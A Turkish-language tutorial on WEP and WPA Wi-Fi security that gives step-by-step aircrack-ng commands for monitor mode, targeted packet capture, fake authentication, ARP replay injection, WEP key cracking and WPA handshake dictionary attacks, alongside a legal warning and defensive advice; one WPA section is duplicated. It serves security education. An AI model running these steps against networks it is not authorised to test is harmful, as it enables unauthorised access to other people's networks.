🔐 WEP (Wired Equivalent Privacy) Nedir?

WEP (Wired Equivalent Privacy – Kabloluya Eşdeğer Gizlilik), 1997 yılında IEEE 802.11 standardı ile tanıtılan, kablosuz ağları şifrelemek için kullanılan ilk güvenlik protokolüdür. Ancak, zayıf şifreleme algoritmaları nedeniyle günümüzde güvenli kabul edilmez ve kullanılması önerilmez.

📌 1️⃣ WEP'in Özellikleri

RC4 Şifreleme Algoritması KullanırWEP, veri paketlerini şifrelemek için RC4 (Rivest Cipher 4) algoritmasını kullanır.

64-bit ve 128-bit Şifreleme

64-bit WEP = 40-bit anahtar + 24-bit IV (Initialization Vector)

128-bit WEP = 104-bit anahtar + 24-bit IV

Statik Anahtar KullanımıTüm istemciler aynı şifreleme anahtarını paylaşır, bu da saldırılara karşı savunmasız hale getirir.

En büyük zayıflığı: IV (Initialization Vector) rastgele olmadığı için tekrar eden şifreleme desenleri oluşturur.

📌 2️⃣ WEP'in Zayıflıkları ve Kırılması

❌ Kısa IV (24-bit) nedeniyle tekrar eden desenler oluşur.

❌ Statik anahtar kullanımı kırılmayı kolaylaştırır.

❌ Zayıf paket analizi ile birkaç dakika içinde kırılabilir.

📌 Aircrack-ng ile WEP Şifresi Nasıl Kırılır?

1️⃣ Monitor modunu aç:

sudo airmon-ng start wlan0

2️⃣ Ağları tara:

sudo airodump-ng wlan0mon

3️⃣ Hedef ağı seç ve paket topla:

sudo airodump-ng -c [Kanal] --bssid [Ağ MAC] -w dump wlan0mon

4️⃣ Paketleri analiz ederek WEP anahtarını kır:

sudo aircrack-ng -b [Ağ MAC] dump.cap

📌 WEP şifresi genellikle birkaç dakika içinde kırılabilir.

📌 3️⃣ WEP Yerine Hangi Protokoller Kullanılmalı?

✅ WPA (Wi-Fi Protected Access) → WEP'in yerini almıştır, ancak WPA1 hala bazı güvenlik açıklarına sahiptir.
✅ WPA2 (AES Şifreleme Kullanır) → Günümüzde en yaygın kullanılan güvenlik protokolüdür.
✅ WPA3 (En Güvenli Seçenek) → Daha güçlü kimlik doğrulama ve şifreleme sağlar.

📌 4️⃣ Sonuç

🚨 WEP, artık güvensiz kabul edilir ve kesinlikle kullanılmamalıdır.🚨 WPA2 veya WPA3 gibi daha güvenli protokoller tercih edilmelidir.🚨 Eski ağ cihazları hala WEP kullanıyorsa, acilen güncellenmelidir.

⚠️ WEP Şifrelerini Kırma ve Güvenlik Açıkları

📌 UYARI: Bu bilgileri yalnızca kendi ağınızı test etmek ve güvenliğinizi artırmak amacıyla kullanmalısınız. Yetkisiz ağlara izinsiz müdahale etmek yasa dışıdır.

🔍 1️⃣ WEP Güvenlik Açıkları Neden Kırılabilir?

Statik anahtar kullanımı, aynı şifreleme anahtarının tekrar tekrar kullanılmasına neden olur.

24-bit IV (Initialization Vector) çok kısa olduğu için tekrar eden desenler oluşur.

Çok sayıda paket toplayarak WEP anahtarını analiz etmek mümkündür.

🛠️ 2️⃣ WEP Şifresini Kırma Adımları

🖥️ Gerekli Araçlar:

✅ Kali Linux veya herhangi bir Linux dağıtımı

✅ Aircrack-ng aracı

✅ Monitor mod destekli bir Wi-Fi adaptörü

🔹 Adım 1: Wi-Fi Adaptörünü Monitor Moduna Al

sudo airmon-ng start wlan0

🔹 Adım 2: Ağları Tarayarak Hedef Seç

sudo airodump-ng wlan0mon

📌 Hedef ağı seçtikten sonra özel olarak o ağı taramak için:

sudo airodump-ng -c [Kanal Numarası] --bssid [Ağ MAC Adresi] -w dump wlan0mon

🔹 Adım 3: Paket Enjeksiyonu (Fake Authentication) ile Veri Toplama

Ağ ile bağlantı kurmak için sahte kimlik doğrulama gönder:

sudo aireplay-ng -1 0 -a [Ağ MAC] -h [Kendi MAC Adresin] wlan0mon

Eğer ağdan paket toplamak yavaş ilerliyorsa ARP replay saldırısı ile hızlandırılabilir:

sudo aireplay-ng -3 -b [Ağ MAC] -h [Kendi MAC Adresin] wlan0mon

🔹 Adım 4: WEP Şifresini Kırma

sudo aircrack-ng -b [Ağ MAC] dump.cap

📌 Yeterli IV toplandıysa WEP şifresi birkaç dakika içinde kırılacaktır.

🔒 3️⃣ WEP Saldırılarına Karşı Korunma

⚠️ WEP artık güvenli değildir ve kullanılmamalıdır.
✅ WEP kullanıyorsanız hemen WPA2 veya WPA3'e geçin.
✅ Ağınızı gizleyin ve MAC filtreleme kullanın.
✅ Daha uzun ve karmaşık şifreler kullanın.
✅ Düzenli olarak ağ trafiğinizi izleyin ve şüpheli hareketleri tespit edin.

📌 4️⃣ Sonuç

✅ WEP, eski ve güvenli olmayan bir protokoldür.
✅ Aircrack-ng gibi araçlar ile kolayca kırılabilir.
✅ Ağ güvenliğini sağlamak için WPA2 veya WPA3 kullanmak şarttır.

# Sahte Yetkilendirme (Fake Authentication) Nedir?

Sahte yetkilendirme (Fake Authentication), saldırganın bir kablosuz ağa bağlıymış gibi görünmesini sağlayan bir tekniktir. Özellikle WEP şifreleme kullanan ağlara saldırırken kullanılır.

## Amaç
- Ağın meşru bir istemcisi gibi görünmek
- Ağa bağlıymış gibi veri paketleri göndermek ve almak
- WEP şifreleme kırma sürecini hızlandırmak

## Fake Authentication Nasıl Çalışır?
Kablosuz ağlarda bir istemcinin (örneğin bir dizüstü bilgisayar veya telefon) bağlanabilmesi için öncelikle erişim noktasına (AP) kimlik doğrulaması yapması gerekir. Bu kimlik doğrulama süreci iki şekilde olabilir:

### 1. Open System Authentication (Açık Sistem Kimlik Doğrulama)
- Kablosuz erişim noktası (AP), bağlanmaya çalışan her istemciyi otomatik olarak kabul eder.
- WEP şifreleme olsa bile bağlantıyı kabul eder, ancak şifrelenmiş trafiği okuyamazsınız.

### 2. Shared Key Authentication (Paylaşılan Anahtar Kimlik Doğrulama)
- AP, bağlanmak isteyen istemciye şifreli bir "challenge" (soru) gönderir.
- İstemci, WEP anahtarını kullanarak bunu yanıtlar.
- Eğer yanıt doğruysa bağlantı sağlanır.

Saldırgan, "Fake Authentication" kullanarak ağda meşru bir istemci gibi görünmeye çalışır.

## Sahte Yetkilendirme Nasıl Yapılır?

### Gerekli Araçlar
- Kali Linux veya herhangi bir Linux dağıtımı
- Aircrack-ng paketi
- Monitor mod destekleyen bir Wi-Fi adaptörü

### 1. Monitor Modunu Aç
Öncelikle kablosuz ağ kartını monitor moda al:

```bash
sudo airmon-ng start wlan0
```
Bu işlem `wlan0mon` gibi yeni bir arayüz oluşturacaktır.

### 2. Hedef Ağları Tara
Çevredeki Wi-Fi ağlarını listelemek için:

```bash
sudo airodump-ng wlan0mon
```

Hedef ağın MAC adresini (BSSID) ve kanal numarasını not al. Özel olarak bir ağı taramak için:

```bash
sudo airodump-ng -c [Kanal No] --bssid [Ağ MAC] -w dump wlan0mon
```

**Örnek:**

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w dump wlan0mon
```
Bu komut belirtilen ağa odaklanarak paketleri kaydeder.

### 3. Fake Authentication Gönder
Erişim noktasına sahte yetkilendirme göndermek için:

```bash
sudo aireplay-ng -1 0 -a [Ağ MAC] -h [Kendi MAC] wlan0mon
```

**Örnek:**

```bash
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```
- Eğer ağ **Open System Authentication** kullanıyorsa anında kabul edilir.
- Eğer ağ **Shared Key Authentication** kullanıyorsa, şifreleme anahtarı olmadan bağlantı reddedilir.

## Fake Authentication'ın Kullanım Alanları
- WEP kırma sürecini hızlandırmak
- Kablosuz ağa bağlı gibi görünerek veri toplamak
- Sahte istemciler oluşturarak sahte AP saldırıları yapmak

⚠️ **Ancak bu teknik, WPA2/WPA3 gibi modern protokollerde işe yaramaz.**

# WPA (Wi-Fi Protected Access) Nasıl Çalışır?

WPA (Wi-Fi Protected Access), kablosuz ağları korumak için geliştirilmiş bir güvenlik protokolüdür. WEP'in zayıflıklarını gidermek amacıyla geliştirilmiş ve daha güçlü şifreleme kullanarak kablosuz ağ güvenliğini artırmıştır.

## 1. WPA'nın Temel Çalışma Mantığı

- **Dinamik Şifreleme Anahtarları Kullanır:**
  - WEP’ten farklı olarak, her pakette farklı bir şifreleme anahtarı kullanılır.
  - Bu, her paketin farklı şifrelenmesini sağlayarak saldırıları zorlaştırır.
- **Kimlik Doğrulama (Authentication) Kullanır:**
  - WPA, kullanıcının ağa bağlanmadan önce kimlik doğrulama yapmasını gerektirir.
- **Gelişmiş Şifreleme Kullanır:**
  - WEP'in zayıf RC4 algoritmasını kullanan WPA, TKIP (Temporal Key Integrity Protocol) ile ek güvenlik sağlar.
  - WPA2 ve WPA3, AES (Advanced Encryption Standard) kullanarak güvenliği daha da artırır.

## 2. WPA Türleri ve Çalışma Şekilleri

| WPA Türü | Şifreleme | Güvenlik Seviyesi |
|----------|-----------|------------------|
| WPA (İlk Versiyon) | TKIP + RC4 | Orta (WEP’ten daha iyi ama kırılabilir) |
| WPA2 | AES-CCMP | Yüksek (Günümüzde yaygın) |
| WPA3 | SAE + AES-GCMP | Çok Yüksek (En güvenlisi) |

# WPA (Wi-Fi Protected Access) Nasıl Çalışır?

WPA (Wi-Fi Protected Access), kablosuz ağları korumak için geliştirilmiş bir güvenlik protokolüdür. WEP'in zayıflıklarını gidermek amacıyla geliştirilmiş ve daha güçlü şifreleme kullanarak kablosuz ağ güvenliğini artırmıştır.

## 1. WPA'nın Temel Çalışma Mantığı

- **Dinamik Şifreleme Anahtarları Kullanır:**
  - WEP’ten farklı olarak, her pakette farklı bir şifreleme anahtarı kullanılır.
  - Bu, her paketin farklı şifrelenmesini sağlayarak saldırıları zorlaştırır.
- **Kimlik Doğrulama (Authentication) Kullanır:**
  - WPA, kullanıcının ağa bağlanmadan önce kimlik doğrulama yapmasını gerektirir.
- **Gelişmiş Şifreleme Kullanır:**
  - WEP'in zayıf RC4 algoritmasını kullanan WPA, TKIP (Temporal Key Integrity Protocol) ile ek güvenlik sağlar.
  - WPA2 ve WPA3, AES (Advanced Encryption Standard) kullanarak güvenliği daha da artırır.

## 2. WPA Türleri ve Çalışma Şekilleri

| WPA Türü | Şifreleme | Güvenlik Seviyesi |
|----------|-----------|------------------|
| WPA (İlk Versiyon) | TKIP + RC4 | Orta (WEP’ten daha iyi ama kırılabilir) |
| WPA2 | AES-CCMP | Yüksek (Günümüzde yaygın) |
| WPA3 | SAE + AES-GCMP | Çok Yüksek (En güvenlisi) |

## 3. WPA Türleri Detaylı Açıklama

### 3.1 WPA (İlk Versiyon) Nasıl Çalışır?
İlk WPA sürümü 2003 yılında tanıtıldı ve WEP’ten daha güvenliydi, ancak hâlâ bazı zayıflıkları vardı.

#### Özellikleri:
- **TKIP (Temporal Key Integrity Protocol) Kullanır:**
  - Her paket için farklı bir şifreleme anahtarı kullanır.
  - WEP gibi statik anahtarlar yerine dinamik anahtarlar ile şifreleme sağlar.
- **MIC (Message Integrity Check) Kullanır:**
  - Verilerin değiştirilip değiştirilmediğini kontrol eder.

🚨 Ancak RC4 şifreleme algoritmasını kullandığı için zamanla kırılabilir hale gelmiştir.

### 3.2 WPA2 Nasıl Çalışır? (En Yaygın Kullanılan)

#### Özellikleri:
- **AES (Advanced Encryption Standard) Kullanır:**
  - WPA2, AES-CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol) kullanır.
  - Bu, askeri düzeyde şifreleme sağlar ve kırılması çok daha zordur.
- **Güçlü Kimlik Doğrulama Kullanır:**
  - 802.1X ve EAP (Extensible Authentication Protocol) ile daha güvenli bir kimlik doğrulama mekanizması vardır.

🚨 Ancak WPA2 de brute-force saldırılarına karşı savunmasız olabilir.

### 3.3 WPA3 Nasıl Çalışır? (En Güvenli WPA Versiyonu)

#### Özellikleri:
- **SAE (Simultaneous Authentication of Equals) Kullanır:**
  - "Dragonfly Handshake" olarak bilinen yeni bir yöntemle, her oturum için farklı bir anahtar oluşturur.
  - WPA2’de olduğu gibi Handshake saldırılarına karşı daha dayanıklıdır.
- **Brute-Force Saldırılarına Dayanıklı:**
  - WPA2’deki offline parola tahmin saldırılarını engeller.
- **Forward Secrecy Sağlar:**
  - Önceki şifreleme anahtarları sızdırılsa bile, yeni oturumlar etkilenmez.

🚨 Ancak, WPA3 desteklemeyen eski cihazlarla uyumsuz olabilir.

## 4. WPA Şifreleme ve Kimlik Doğrulama Mekanizması

WPA ile kablosuz ağlara bağlanırken iki ana yöntem kullanılır:

| WPA Bağlantı Türü | Kullanım Alanı |
|-------------------|--------------|
| WPA-Personal (WPA-PSK) | Ev ağları ve küçük işletmeler |
| WPA-Enterprise (WPA-EAP) | Büyük şirketler ve kurumsal ağlar |

### Bağlantı Süreçleri:
1. Cihaz, Wi-Fi şifresini kullanarak ağa bağlanmaya çalışır.
2. Router, cihazın kimlik doğrulamasını yapar ve "4-way handshake" başlatır.
3. Ağ, cihaz ve router arasında dinamik olarak oluşturulan şifreleme anahtarları kullanılır.
4. Veriler güvenli bir şekilde şifrelenerek iletilir.

## 5. WPA'nın Güvenlik Açıkları

### WPA-PSK (Wi-Fi Şifresi) Kırılabilir mi?
✅ Evet, eğer zayıf bir parola kullanılmışsa!
- WPA şifresini kırmak için brute-force (kaba kuvvet) saldırıları ve dictionary attack (sözlük saldırıları) kullanılabilir.
- Eğer bir saldırgan WPA handshake paketlerini yakalarsa, bunları Hashcat veya Aircrack-ng ile kırmaya çalışabilir.

📌 Örneğin, WPA handshake yakalamak için:
```bash
sudo airodump-ng -c [Kanal] --bssid [Ağ MAC] -w dump wlan0mon
```
📌 Yakalanan handshake ile brute-force saldırısı yapmak:
```bash
sudo aircrack-ng -b [Ağ MAC] -w [Wordlist] dump.cap
```

🚨 WPA3, brute-force saldırılarına karşı çok daha güçlüdür ve offline saldırıları engeller.

## 6. WPA Güvenliği İçin En İyi Uygulamalar

✅ **Güçlü Bir WPA2/WPA3 Parolası Kullanın:**
  - Uzun (en az 16 karakter) ve karmaşık bir parola seçin.
✅ **WPA3 Destekleyen Cihazlar Kullanın:**
  - Eski WPA2 cihazlarını güncelleyin veya değiştirin.
✅ **MAC Filtreleme Kullanın:**
  - Sadece belirli MAC adreslerinin bağlanmasına izin verin.
✅ **Router Güncellemelerini ve Güvenlik Yamalarını Uygulayın.**
✅ **Ağınızı Düzenli Olarak İzleyin ve Şüpheli Cihazları Engelleyin.**

## 7. Sonuç

✅ WPA, kablosuz ağları korumak için geliştirilmiş bir güvenlik protokolüdür.
✅ WPA2, AES-CCMP şifreleme ile hala en yaygın kullanılan protokoldür.
✅ WPA3, brute-force saldırılarına karşı en dayanıklı seçenektir.
✅ Eski WPA sürümleri ve zayıf şifreler saldırılara karşı savunmasız olabilir.

Devamı var
